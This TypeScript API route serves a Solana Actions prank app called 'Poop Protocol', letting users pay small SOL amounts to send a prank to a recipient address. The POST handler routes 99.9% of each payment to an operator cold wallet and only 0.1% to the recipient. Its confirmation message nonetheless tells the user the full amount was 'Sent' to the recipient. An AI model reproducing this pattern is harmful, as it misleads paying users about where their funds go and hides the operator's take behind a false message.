import { 
  ActionGetResponse, 
  ActionPostRequest, 
  createPostResponse,
  ACTIONS_CORS_HEADERS,
} from "@solana/actions";
import { 
  clusterApiUrl, 
  Connection, 
  LAMPORTS_PER_SOL, 
  PublicKey, 
  SystemProgram, 
  Transaction 
} from "@solana/web3.js";
import { POOP_CONFIG } from "@/app/config"; // Используем абсолютный путь через @

// OPTIONS request handler for CORS
export const OPTIONS = async () => {
  return new Response(null, {
    status: 200,
    headers: ACTIONS_CORS_HEADERS,
  });
};

// GET request handler - Returns the action UI
export const GET = async (req: Request) => {
  try {
    const requestUrl = new URL(req.url);
    const recipientParam = requestUrl.searchParams.get("recipient");

    let recipientAddress = "";
    if (recipientParam) {
      try {
        const pubkey = new PublicKey(recipientParam);
        recipientAddress = pubkey.toString();
      } catch (error) {
        return new Response("Invalid recipient address", { status: 400 });
      }
    }

    // Define the response based on whether a recipient was provided
    const payload: ActionGetResponse = {
      title: "Poop Protocol",
      icon: new URL("/poop-cover.png", req.url).toString(), // Absolute URL for icon
      description: "Send a poop prank to someone on Solana!",
      label: "Poop",
      links: {
        actions: recipientAddress ? [
          // If recipient is provided, show the poop options
          {
            label: "💩 Classic (0.002 SOL)",
            href: `${req.url}?type=classic&recipient=${recipientAddress}`, // Absolute URL for href
          },
          {
            label: "😈 Revenge (0.003 SOL)",
            href: `${req.url}?type=revenge&recipient=${recipientAddress}`, // Absolute URL for href
          },
          {
            label: "🎁 Gift (0.002 SOL)",
            href: `${req.url}?type=gift&recipient=${recipientAddress}`, // Absolute URL for href
          },
        ] : [
          // If no recipient, prompt for one
          {
            label: "Enter recipient address",
            href: `${req.url}?recipient={recipient}`, // Absolute URL for href with placeholder
            parameters: [
              {
                name: "recipient",
                label: "Recipient address",
                required: true,
              },
            ],
          },
        ],
      },
    };

    // Create response with correct headers for Solana Actions
    const response = new Response(JSON.stringify(payload), {
      headers: {
        "Content-Type": "application/json",
        ...ACTIONS_CORS_HEADERS, // Include standard CORS headers
        "X-Action-Version": "1", // Required header
        "X-Blockchain-Ids": "mainnet-beta", // Required header
      },
    });

    return response;
  } catch (err) {
    console.log("Error in GET /api/actions/poop:", err);
    return new Response("An error occurred", { status: 500 });
  }
};

// POST request handler - Creates the transaction for the user to sign
export const POST = async (req: Request) => {
  try {
    // Parse the incoming request body containing the user's account info
    const body: ActionPostRequest = await req.json();

    // Extract user's public key from the request
    const account = new PublicKey(body.account);
    const url = new URL(req.url);
    
    // Get recipient address and type from URL query parameters
    const recipientParam = url.searchParams.get("recipient");
    const type = url.searchParams.get("type") || "classic"; // Default to 'classic' if not specified
    
    // Validate that recipient address was provided
    if (!recipientParam) {
      return new Response("Missing recipient parameter", { status: 400 });
    }

    // Validate recipient address format
    let recipientAddress: PublicKey;
    try {
      recipientAddress = new PublicKey(recipientParam);
    } catch (error) {
      return new Response("Invalid recipient address", { status: 400 });
    }

    // Look up the configuration for the selected poop type
    const config = POOP_CONFIG[type as keyof typeof POOP_CONFIG];
    if (!config) {
      return new Response("Invalid poop type", { status: 400 });
    }
    
    const amount = config.amount;
    // Calculate amounts for cold wallet (99.9%) and recipient (0.1%)
    const coldWalletAmount = amount * 0.999;
    const recipientAmount = amount * 0.001;

    // Connect to Solana network
    const connection = new Connection(
      process.env.SOLANA_RPC_URL || clusterApiUrl("mainnet-beta")
    );

    // Create a transaction with two transfers:
    // 1. Send 99.9% of the amount to the cold wallet
    // 2. Send 0.1% of the amount to the recipient
    const transaction = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: account,
        toPubkey: new PublicKey(process.env.COLD_WALLET_PUBLIC_KEY!), // Cold wallet receives 99.9%
        lamports: Math.round(coldWalletAmount * LAMPORTS_PER_SOL),
      }),
      SystemProgram.transfer({
        fromPubkey: account,
        toPubkey: recipientAddress, // Recipient receives 0.1%
        lamports: Math.round(recipientAmount * LAMPORTS_PER_SOL),
      })
    );

    // Set the fee payer to the user's account and add recent blockhash
    transaction.feePayer = account;
    transaction.recentBlockhash = (
      await connection.getLatestBlockhash()
    ).blockhash;

    // Serialize the transaction so it can be sent back to the client
    const serializedTransaction = transaction.serialize({
      requireAllSignatures: false, // Allow partial signatures
      verifySignatures: false,     // Don't verify signatures yet
    });

    // Prepare the response payload containing the transaction
    const payload = await createPostResponse({
      fields: {
        type: "transaction", // Specify the type of response
        transaction: serializedTransaction as any, // Cast to any to handle type mismatch
        message: `Sent ${amount} SOL to ${recipientAddress.toString()} via Poop Protocol`, // Message for the user
      },
    });

    // Return the response with correct headers
    return new Response(JSON.stringify(payload), {
      headers: {
        "Content-Type": "application/json",
        ...ACTIONS_CORS_HEADERS, // Include standard CORS headers
        "X-Action-Version": "1", // Required header
        "X-Blockchain-Ids": "mainnet-beta", // Required header
      },
    });
  } catch (err) {
    console.log("Error in POST /api/actions/poop:", err);
    return new Response("An error occurred", { status: 500 });
  }
};
